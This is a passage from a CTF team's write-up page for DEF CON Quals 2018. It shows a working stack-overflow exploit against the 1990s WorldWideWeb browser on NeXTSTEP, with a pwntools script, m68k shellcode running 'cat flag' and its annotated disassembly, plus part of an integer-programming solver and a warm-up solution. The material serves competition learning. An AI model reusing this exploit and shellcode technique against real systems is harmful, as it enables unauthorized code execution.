</span></span><span class=line><span class=cl>    <span class=n>cnt</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpVariable</span><span class=o>.</span><span class=n>dicts</span><span class=p>(</span><span class=s1>&#39;cnt&#39;</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)),</span> <span class=n>lowBound</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>upBound</span><span class=o>=</span><span class=mi>999</span><span class=p>,</span> <span class=n>cat</span><span class=o>=</span><span class=s1>&#39;Integer&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>used</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpVariable</span><span class=o>.</span><span class=n>dicts</span><span class=p>(</span><span class=s1>&#39;used&#39;</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)),</span> <span class=n>cat</span><span class=o>=</span><span class=s1>&#39;Binary&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>used</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>atoms</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>*</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)))</span> <span class=o>==</span> <span class=mi>2</span><span class=o>**</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>cnt</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>prob</span> <span class=o>+=</span> <span class=n>used</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s1>&#39;C_</span><span class=si>{}</span><span class=s1>_upper&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>prob</span> <span class=o>+=</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>10000</span><span class=o>*</span><span class=n>used</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s1>&#39;C_</span><span class=si>{}</span><span class=s1>_lower&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>first_part_atoms</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>prob</span> <span class=o>+=</span> <span class=n>used</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>prob</span><span class=o>.</span><span class=n>solve</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>pulp</span><span class=o>.</span><span class=n>value</span><span class=p>(</span><span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>value</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>formula</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=si>{}{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>atoms</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span> <span class=n>value</span> <span class=k>if</span> <span class=n>value</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=k>else</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>formula</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LICENSE_ADDR</span> <span class=o>=</span> <span class=mh>0x6033d0</span>
</span></span><span class=line><span class=cl><span class=n>LICENSE_QWORDS</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>LICENSE_QWORDS</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>goal</span> <span class=o>=</span> <span class=n>LICENSE_ADDR</span> <span class=o>+</span> <span class=mi>8</span><span class=o>*</span><span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;0x</span><span class=si>{:x}</span><span class=s1>: </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>goal</span><span class=p>,</span> <span class=n>formula</span><span class=p>(</span><span class=n>goal</span><span class=p>)))</span>
</span></span></code></pre></div><h2 class="relative group">WWW<div id=www class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#www aria-label=Anchor>#</a></span></h2><p>www, aka pwning browsers from the 90s.</p><h3 class="relative group">Challenge Description<div id=challenge-description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-description aria-label=Anchor>#</a></span></h3><p>The challenge asks for a URL to be visited by the browser WorldWideWeb 0.15
running on the NeXTSTEP OS (arch m68k).</p><p>Once submitted the URL, the challenges returns a set of screenshots captured
during the execution of the browser.</p><h3 class="relative group">Vulnerability<div id=vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerability aria-label=Anchor>#</a></span></h3><p>First, by submitting a test URL and inspecting the returned screenshots, we were
able to identify the OS version and the browser. Then, we found and configured a
NeXTSTEP m68k emulator: <a href=http://previous.alternative-system.com/ target=_blank>http://previous.alternative-system.com/</a>, on which we
installed the WorldWideWeb browser and a version of gdb. We were also able to
download the browser sources, from which we identified a classic stack overflow.</p><p>In fact, the <code>HTTP_Get</code> function contains a 257 bytes buffer (<code>command</code>), used
to perform the HTTP GET request, and then copies the URL into it without
checking sizes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#ifdef __STDC__
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>HTTP_Get</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span> <span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>HTTP_Get</span><span class=p>(</span><span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span> <span class=n>arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>s</span><span class=p>;</span>                  <span class=cm>/* Socket number for returned data */</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>command</span><span class=p>[</span><span class=mi>257</span><span class=p>];</span>      <span class=cm>/* The whole command */</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>status</span><span class=p>;</span>             <span class=cm>/* tcp return */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>command</span><span class=p>,</span> <span class=s>&#34;GET &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span> <span class=n>p1</span> <span class=o>=</span> <span class=nf>HTParse</span><span class=p>(</span><span class=n>arg</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=n>PARSE_PATH</span><span class=o>|</span><span class=n>PARSE_PUNCTUATION</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>strcat</span><span class=p>(</span><span class=n>command</span><span class=p>,</span> <span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><h3 class="relative group">Exploit<div id=exploit-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-1 aria-label=Anchor>#</a></span></h3><p>We were very happy to realize that no security measure (NX, ASLR,..) was
implemented in the 90s. This means we could craft a shellcode, put it in the
stack (together with a nice NOP sled), jump to it, and execute it.</p><p>After several attempts to write a working shellcode for m68k we were
successfully able to execute commands. First, we tried by executing <code>system("open flag")</code>,
which runs a graphic text editor opening the flag file. However, on the remote
machine the editor appeared behind the browser window, hiding half of the flag.
Second, we executed <code>cat flag</code>, looking at the output in the already opened
console. Even in this case we failed, as last chars of the flag were still
behind the browser window. Finally, by executing <code>cat flag</code> five times in our
shellcode, we were able to see the entire flag.</p><p>Flag: <code>defconctf{Party_like_its_1992_for_the_next_Step}</code></p><p>Exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;ddee3e1a.quals2018.oooverflow.io&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span>  <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DOUBLE_NOP</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x4e\x71\x4e\x71</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x2c\x4f\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x2c\xc2\x22\x0f\x59\x8f\x2e\x81\x2c\x4f\x45\xf9\x05\x03\x07\xf8\x4e\x92</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;http://&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>259</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x03\xff\xf7\xf8</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>DOUBLE_NOP</span> <span class=o>*</span> <span class=mi>100</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Welcome to the pre-alpha web aka &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Token : &#34;</span><span class=o>+</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;What URL would you like this old dog to fetch?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s1>&#39;sending:&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>payload</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cose</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;DEBUG &#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>6</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>cose</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>cose</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b64</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;/image&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s2>&#34;0&#34;</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;.png&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>b64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Saved image&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span></code></pre></div><h3 class="relative group">Shellcode<div id=shellcode class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#shellcode aria-label=Anchor>#</a></span></h3><pre tabindex=0><code>\x2c\x4f                    ## moveal %sp,%fp                
\xb5\x82                    ## eorl %d2,%d2
\x06\x82\x63\x61\x74\x20    ## addil #1667331104,%d2 --&gt; &#39;cat &#39;
\x2c\xc2                    ## moveal %d2,%fp@+

\xb5\x82                    ## eorl %d2,%d2
\x06\x82\x66\x6c\x61\x67    ## addil #1718378855,%d2 --&gt; &#39;flag&#39;
\x2c\xc2                    ## moveal %d2,%fp@+

\xb5\x82                    ## eorl %d2,%d2
\x06\x82\x3b\x20\x20\x20    ## addil #991961120,%d2 --&gt; &#39;;   &#39;
\x2c\xc2                    ## moveal %d2,%fp@+

. x4: we repeated &#39;cat flag;   &#39; to make the  
. output appear under the browser window..

\xb5\x82                    ## eorl %d2,%d2
\x2c\xc2                    ## moveal %d2,%fp@+

\x22\x0f                    ## moveal %sp,%d1
\x59\x8f                    ## subql #4,%sp
\x2e\x81                    ## moveal %d1,%sp@
\x2c\x4f                    ## moveal %sp,%fp
\x45\xf9\x05\x03\x07\xf8    ## lea 0x050307f8,%a2 --&gt; system() address
\x4e\x92                    ## jsr %a2@
</code></pre><h2 class="relative group">You Already Know<div id=you-already-know class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#you-already-know aria-label=Anchor>#</a></span></h2><p>This was a simple warmup challenge. We were told that, if we could read the challenge description, we already knew the flag.
Indeed, opening Chromium&rsquo;s developer tools and inspecting the responses of the XHR request to retrieve the description
in the scoreboard, the flag was hidden in plain sight inside a React comment. Really, we already knew.</p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2018-05-20-defconctfquals-2018-all-writeups/index.md data-oid-likes=likes_writeups/2018-05-20-defconctfquals-2018-all-writeups/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span></span><span><a class="flex text-right group ml-3" href=/writeups/2018-05-27-rctf-2018-all-writeups/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Rctf 2018 - Write ups</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-05-27T00:00:00+00:00>27 May 2018</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 